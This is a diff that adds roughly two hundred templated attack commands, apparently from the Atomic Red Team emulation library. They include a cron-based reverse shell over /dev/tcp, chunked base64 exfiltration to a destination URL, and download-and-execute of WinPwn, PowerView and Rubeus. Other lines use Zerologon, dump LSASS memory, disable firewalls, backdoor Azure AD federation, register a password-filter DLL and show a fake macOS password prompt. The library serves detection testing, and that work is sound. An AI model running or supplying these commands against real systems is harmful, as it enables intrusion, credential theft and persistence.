@@ -1,0 +1,220 @@
+Start-Process "#{exe_binary}";Start-Sleep -Seconds 7;Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+cd "PathToAtomicsFolder\ExternalPayloads\";Import-Module .\Extract-Invoke-PSImage.ps1;$extractedScript=Extract-Invoke-PSImage -Image "#{image_file}" -Out "$HOME\result.ps1";$scriptContent = Get-Content "$HOME\result.ps1" -Raw;$base64Pattern = "(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])";$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value };$base64Strings | Set-Content "$HOME\decoded.ps1";$decodedContent = Get-Content "$HOME\decoded.ps1" -Raw;$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent));$textPattern = '^.+'  ;$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value };$scriptPath = "$HOME\textExtraction.ps1";$textMatches -join '' | Set-Content -Path $scriptPath;. "$HOME\textExtraction.ps1"
+reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}" /f /v ImagePath /d "#{malicious_service_path}"
+sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}&&sudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}
+fsutil fsinfo drives
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library "#{source_file}";C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{output_file}
+env | grep LANG&&printenv LANG&&set | grep LANG
+gcloud config set project #{project-id}&&gcloud iam roles create #{role-name} --description="#{role-description}" --permissions=#{roles} --project=#{project-id}
+$file = Get-Item $env:temp\T1564.001-10.txt -Force;$file.attributes='System'
+$file = [System.IO.File]::OpenRead(#{source_file_path});$chunkSize = #{chunk_size} * 1KB;$buffer = New-Object Byte[] $chunkSize;;while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {;    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead);    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk;};$file.Close()
+Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}
+reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion;reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "proxy.atomic-test.com:8080" /f
+aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}
+set file=#{output_file_path}\user_info_%random%.tmp;echo Username: %USERNAME% > %file%;echo User Domain: %USERDOMAIN% >> %file%;net users >> %file%;query user >> %file%
+vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%
+"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}"
+lsadump::zerologon /target:${dc_name}.${domain} /account:${username} /exploit
+Copy-Item ${source_file_path} -Destination ${share_file_path} -Recurse -Container
+aws iam get-account-password-policy
+dd if=/dev/zero bs=1 count=1 >> #{file_to_pad} #adds null bytes&&dd if=/dev/random bs=1 count=1 >> #{file_to_pad} #adds high-quality random data&&dd if=/dev/urandom bs=1 count=1 >> #{file_to_pad} #adds low-quality random data
+Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}
+mkdir -p /var/spool/mail/copy&&for file in /var/spool/mail/*; do&&  if [ "$(basename "$file")" != "copy" ]&&  then&&    cp -R "$file" /var/spool/mail/copy/&&    if [ -f "/var/spool/mail/copy/$(basename "$file")" ]; then&&      echo "Modification for Atomic Red Test" >> "/var/spool/mail/copy/$(basename "$file")"&&    fi&&  fi&&done
+$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');dotnet -consoleoutput -noninteractive
+cat email.txt | ssmtp ${username}@${domain}
+aws iam create-access-key --user-name #{username} > "$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds"&&cd "$PathToAtomicsFolder/T1098.001/bin/"&&./aws_secret.sh
+$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore);if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id };C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
+$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');lazagnemodule -consoleoutput -noninteractive
+$syntaxList = #{syntax};foreach ($syntax in $syntaxList) {;#{SharpView} $syntax -}
+wmic /node:${ip_address} /user:${username} /password:${password} process call create "cmd.exe /c ${command}"
+Enter-PSSession -ComputerName ${ip_address} -Credential ${password}
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso" -OutFile "$env:TEMP\qbot-test.iso");Mount-DiskImage -ImagePath "$env:TEMP\qbot-test.iso";$mountedpath = (Get-DiskImage -ImagePath "$env:TEMP\qbot-test.iso" | Get-Volume).DriveLetter;$finalpath = $mountedpath + ":\";cd $finalpath;.\calc.exe.lnk
+podman build -t t1613 $PathtoAtomicsFolder/T1613/src/&&podman run --name t1613_container -d -t t1613&&podman ps&&podman stats --no-stream&&podman inspect $(podman ps -l -q --filter ancestor=t1613)
+sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)
+az login;$userprincipalname = "#{userprincipalname}";az ad user delete --id $userprincipalname
+Invoke-SMBEnum -Target ${ip_address} -Domain ${domain} -Username ${username} -Hash ${ntlm} -Command ${command} -verbose
+New-Item -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -ItemType Directory -ErrorAction Ignore;Get-ChildItem -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -Recurse -Force -ErrorAction Ignore };Get-ChildItem -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -File | ForEach-Object { Add-Content -Path $_.FullName -Value "Modification for Atomic Red Test" -ErrorAction Ignore }
+iptables-save > /tmp/iptables.rules&&iptables -F
+sudo #{program_path} -a -f -t 3
+sudo -l      &&sudo cat /usr/local/etc/sudoers&&sudo ee /usr/local/etc/sudoers
+& "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -h #{domain} -s subtree -f "objectclass=computer" *
+C:\Windows\System32\inetsrv\appcmd.exe list apppool /config
+net stop w32time;Copy-Item "$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll;reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f;reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "Enabled" /d "1" /f;reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "InputProvider" /d "1" /f;net start w32time
+$file = Get-Item $env:temp\T1564.001-9.txt -Force;$file.attributes='Hidden'
+copy-item -Path "\\#{remote}\C$\#{share_file}" -Destination "$Env:TEMP\#{local_file}"
+Start-BitsTransfer -Source ${source_file_path} -Destination ${share_file_path}
+wmic /node:"#{node}" product where "name like '#{product}%%'" call uninstall
+Compress-Archive -Path "#{input_file}" -DestinationPath #{output_file} -Force
+if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi&&echo -n "* * * * * root /bin/bash -c '/bin/bash -c echo \"\"; echo \"hello from host! " > #{mount_point}#{cron_path}/#{cron_filename}&&echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}&&echo -n "(hostname) " >> #{mount_point}#{cron_path}/#{cron_filename}&&echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}&&echo "(id)\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'" >> #{mount_point}#{cron_path}/#{cron_filename}&&netcat -l -p #{listen_port} 2>&1
+PWD_SPOOF=$(osascript -e 'display dialog "To perform a security update MacOS needs your passphrase." with title "MacOS Security Update" default answer "" with icon stop with hidden answer')&&echo $PWD_SPOOF
+useradd --create-home --shell /bin/bash art&&su --login art&&echo 'echo "Atomic Red Team was here... T1546.004" >> $HOME/art.txt' >> $HOME/.bash_logout
+find / -path "*/Safari/Bookmarks.plist" 2>/dev/null >> #{output_file} &&cat #{output_file} 
+echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+echo quit | telnet #{domain} #{port}&&exit 0
+New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force;New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force
+$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');Kerberoasting -consoleoutput -noninteractive
+echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+sc.exe create "WerFaultSvc" binPath= "$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe" DisplayName= "WerFault Service" start= auto
+sudo modprobe #{rootkit_name}&&ping -c 10 localhost >/dev/null & TARGETPID="$!"&&ps $TARGETPID&&kill -31 $TARGETPID&&ps $TARGETPID || echo "process ${TARGETPID} hidden"
+echo "# THIS IS A COMMENT" >> /etc/ufw/sysctl.conf&&grep "# THIS IS A COMMENT" /etc/ufw/sysctl.conf
+sudo cp #{script_location} #{script_destination}&&sudo touch /private/var/db/emondClients/#{empty_file}
+cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
+PowerShell -version 2 -command '#{v2_command}'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing);$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n";Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
+powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}
+cd $HOME&&curl -O #{remote_url}/art&&curl -O #{remote_url}/gta.db&&curl -O #{remote_url}/sqlite_dump.sh&&chmod +x sqlite_dump.sh&&find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+mkdir #{file_or_folder} >nul 2>&1;echo T1222.001_attrib1 >> #{file_or_folder}\T1222.001_attrib1.txt;echo T1222.001_attrib2 >> #{file_or_folder}\T1222.001_attrib2.txt;attrib.exe +h #{file_or_folder}\T1222.001_attrib1.txt;attrib.exe +h #{file_or_folder}\T1222.001_attrib2.txt
+dir \\#{computer_ip}\c$;dir \\#{computer_ip}\admin$;dir \\#{computer_ip}\IPC$
+Import-Module AzureAD;Import-Module AADInternals;;$PWord = ConvertTo-SecureString -String "#{azure_password}" -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{azure_username}", $Pword;;try {;  Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null;};catch {;  Write-Host "Error: AzureAD could not connect";  exit 1;};;try {;  $domain = Get-AzureADDomain -Name "#{domain_name}";};catch {;  Write-Host "Error: domain ""#{domain_name}"" not found";  exit 1;};if (-Not $domain.IsVerified) {;  Write-Host "Error: domain ""#{domain_name}"" not verified";  exit 1;};;if ($domain.AuthenticationType -eq "Federated") {;  Write-Host "Error: domain ""#{domain_name}"" already federated. Try with a different domain or re-create it before.";  exit 1;};;$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential;if (-Not $at) {;  Write-Host "Error: AADInternals could not connect";  exit 1;};;$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName "#{domain_name}";if ($new) {;  Write-Host "Federation successfully added to Azure AD";  Write-Host $new;};else {;  Write-Host "The federation setup failed";};;Write-Host "End of federation configuration."
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1');Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"
+sh #{filename} #{audiofile} #{duration}
+ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b "CN=Users,DC=#{domain},DC=#{top_level_domain}" "(objectClass=group)" -s sub -a always -z 1000 dn 
+Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false ;Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass};(Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = "CommunitySupported"});Disconnect-VIServer -Confirm:$false
+copy "#{filename}" %TEMP%\LibHello.js;#{jscpath}\#{jscname} /t:library %TEMP%\LibHello.js
+Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}
+sudo sh -c "echo Defaults "'!'"tty_tickets >> /usr/local/etc/sudoers"&&sudo visudo -c -f /usr/local/etc/sudoers
+Enter-PSSession -ComputerName ${ip_address} -Port ${port} -Credential ${password}
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
+useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art&&su art&&cd /tmp&&curl -s #{remote_url} |bash
+iptables-save > /tmp/iptables.rules&&iptables -D OUTPUT -p tcp --dport 21 -j DROP
+New-Item -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -ItemType Directory -ErrorAction Ignore;Get-ChildItem -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -Recurse -Force -ErrorAction Ignore };Remove-Item -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -Recurse -Force -ErrorAction Ignore
+reg query HKLM /f password /t REG_SZ /s;reg query HKCU /f password /t REG_SZ /s
+taskkill.exe /f /im #{process_name}
+echo -e ${email_content} | ssmtp ${username}@${domain}
+curl -s -A "HttpBrowser/1.0" -m3 #{domain}&&curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}&&curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}&&curl -s -A "*<|>*" -m3 #{domain}
+echo "#{at_command}" | at #{time_spec}
+cmd /c "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe" #{remote_file} #{destination_path}
+tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
+pscp ${source_file_path} ${username}@${ip_address}:${media_file_path}
+ldifde.exe -f #{output_path}\#{output_file} -p subtree
+# Extract line with IP address from the syslog configuration output;#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_get_loghost.txt | findstr /r "[0-9]*\.[0-9]*\.[0-9]*\." > c:\temp\loghost.txt;;# Replace the IP with "0";#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_remove_loghost.txt;;# Extract the IP from the line extracted from findstr;$inputFilePath = "c:\temp\loghost.txt";$outputFilePath = "c:\temp\loghost_ip.txt";;$fileContent = Get-Content -Path $inputFilePath -Raw;;if ([string]::IsNullOrWhiteSpace($fileContent)) {;    Write-Host "The content is $fileContent";    Write-Host "The file is empty";} else {;    # Use a regular expression to extract IP addresses;    $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\/\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value;    ;    $output = "esxcli system syslog config set --loghost=" + $ipAddresses;;    $output | Out-File -FilePath $outputFilePath -Encoding ascii;    ;    Write-Host "IP addresses extracted and saved to $outputFilePath";}
+$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Manufacturer";$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Model";if((($Manufacturer.ToLower() -eq "microsoft corporation") -and ($Model.ToLower().contains("virtual"))) -or ($Manufacturer.ToLower().contains("vmware")) -or ($Model.ToLower() -eq "virtualbox")) {write-host "Virtualization environment detected!"} else {write-host "No virtualization environment detected!"}
+#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1562.004\src\esxi_disable_firewall.txt
+Unblock-File -Path #{file_path}
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1');Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
+for %i in (C$ IPC$ ADMIN$) do net share %i /delete
+Invoke-RestMethod -Uri ${remote_file} -OutFile ${local_path}
+$sampleData = "Sample data for exfiltration test";Set-Content -Path "#{sampleFile}" -Value $sampleData;$ftpUrl = "#{ftpServer}";$creds = Get-Credential -Credential "#{credentials}";Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "#{sampleFile}" -Credential $creds
+reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose
+Start-BitsTransfer -Source ${source_file_path} -Destination ${media_file_path}
+C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*;C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*;C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*
+at 13:20 /interactive cmd
+sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"&&sudo visudo -c -f /etc/sudoers
+$PathToAtomicsFolder\T1106\bin\x64\syscall.exe -debug
+$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=';$Content = [System.Convert]::FromBase64String($key);Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte;C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library /keyfile:$env:Temp\key.snk #{source_file};C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{output_file}
+netsh firewall set opmode mode=disable
+cp #{calc_plist_path} ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
+sc query type=service > %TEMP%\T1119_1.txt;doskey /history > %TEMP%\T1119_2.txt;wmic process list > %TEMP%\T1119_3.txt;tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt
+reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ "PathToAtomicsFolder\T1556.002\lsa_backup.reg";$passwordFilterName = (Copy-Item "#{dll_path}\#{dll_name}" -Destination "C:\Windows\System32" -PassThru).basename;$lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\";$notificationPackagesValues = $lsaKey.GetValue("Notification Packages");$notificationPackagesValues += $passwordFilterName;Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues
+gcloud config set project #{project_id}&&gcloud storage buckets delete gs://#{bucket_name}
+Mount-DiskImage -ImagePath "#{path_of_iso}" -StorageType ISO -Access ReadOnly;$keep = Get-Volume -FileSystemLabel "AllTheThings";$driveLetter = ($keep | Get-Volume).DriveLetter;$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID("{c08afd90-f2a1-11d1-8455-00a0c91f3880}"));$instance.Document.Application.ShellExecute($driveLetter+":\document.lnk","",$driveLetter+":\",$null,0)
+kubectl get secrets -n #{namespace}
+set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
+time
+cd /tmp&&curl -s #{remote_url} |bash&&ls -la /tmp/art.txt      
+[ "$(uname)" = 'FreeBSD' ] && encodecmd="b64encode -r -" && decodecmd="b64decode -r" || encodecmd="base64 -w 0" && decodecmd="base64 -d"&&ART=$(echo -n "id" | $encodecmd)&&echo "\$ART=$ART"&&echo -n "$ART" | $decodecmd |/bin/bash&&unset ART
+New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR;Get-ChildItem -Path HKCR:\CLSID -Name | Select -Skip 1 > $env:temp\clsids.txt;ForEach($CLSID in Get-Content "$env:temp\clsids.txt");{try{write-output "$($Position)-$($CLSID)";write-output "------------"| out-file #{output_file} -append;write-output $($CLSID)| out-file #{output_file} -append;$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID));$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append;$position += 1} catch{}}
+try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop };catch { $_; exit $_.Exception.HResult }
+dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}
+curl ${remote_destination} -o $ ${local_path}
+$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');powerSQL -noninteractive -consoleoutput
+Set-ExecutionPolicy -Scope Process Bypass -Force;$owners = @{};gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}};& "$PathToAtomicsFolder\T1134.002\src\GetToken.ps1"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
+docker build -t t1609  $PathtoAtomicsFolder/T1609/src/ &&docker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh&&docker exec -i t1609_container bash -c "cat /tmp/output.txt"
+sudo touch /Library/StartupItems/EvilStartup.plist
+$lockout_threshold = [int]"#{lockout_threshold}";for ($var = 1; $var -le $lockout_threshold; $var++) {;  #{plink_file} -ssh "#{vm_host}" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002;  }
+""%PROGRAMFILES%\dcrypt"\#{dcrypt_exe}"
+New-NetEventSession -Name Capture007 -LocalFilePath "$ENV:Temp\sniff.etl";Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100;Start-NetEventSession -Name Capture007;Stop-NetEventSession -Name Capture007;Remove-NetEventSession -Name Capture007
+New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "#{dll_path}"
+$plaintext = ([system.Text.Encoding]::UTF8.getBytes("#{plaintext}"));$key = "#{key}";$cyphertext =  @();;for ($i = 0; $i -lt $plaintext.Count; $i++) {; $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];;};$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext);[System.Net.ServicePointManager]::Expect100Continue = $false;Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive
+echo '#{text_to_append}' >> ~/.profile
+"#{trufflesnout_path}" forest -n #{domain};"#{trufflesnout_path}" domain -n #{domain}
+get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL;get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL
+echo '#{text_to_append}' >> /etc/profile
+pw adduser art -g wheel -s /bin/sh&&echo "password123" | pw usermod art -h 0&&su art&&cd /tmp&&curl -s #{remote_url} |bash
+reg.exe add HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f
+$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption).LegalNoticeCaption;$orgLegalNoticeText = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText).LegalNoticeText;$newLegalNoticeCaption = "#{legal_notice_caption}";$newLegalNoticeText = "#{legal_notice_text}";Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force;Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force      
+$file = Join-Path $env:USERPROFILE "Desktop\rustdesk-1.2.3-1-x86_64.exe";Invoke-WebRequest  -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe;Start-Process -FilePath $file "/S"
+Import-Module ExchangeOnlineManagement;$secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force;$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd;Connect-ExchangeOnline -Credential $creds;Add-MailboxPermission -Identity "#{delegate_target}" -User "#{operator_mailbox}" -AccessRights FullAccess -InheritanceType All;Disconnect-ExchangeOnline -Confirm:$false
+uname -srm
+export ART='echo "Atomic Red Team was here... T1059.004"'&&echo $ART |/bin/sh
+nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%
+echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+Start-BitsTransfer -Source ${source_file_path} -Destination ${remote_destination}
+icacls "#{path}" /grant Everyone:F /T /C /Q
+"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 5
+ldapdomaindump -u #{username} -p #{password} #{target_ip} -o /tmp/T1087
+net group /domain "Domain controllers"
+apt install xclip -y&&history | tail -n 30 | xclip -sel clip&&xclip -o > history.txt
+secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt
+[ "$(uname)" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art&&cat /etc/passwd |grep ^art&&chsh -s /bin/sh art&&cat /etc/passwd |grep ^art
+osascript -e 'tell application "Terminal" to do script "tor"'
+tail /var/log/ufw.log
+reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
+Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output}
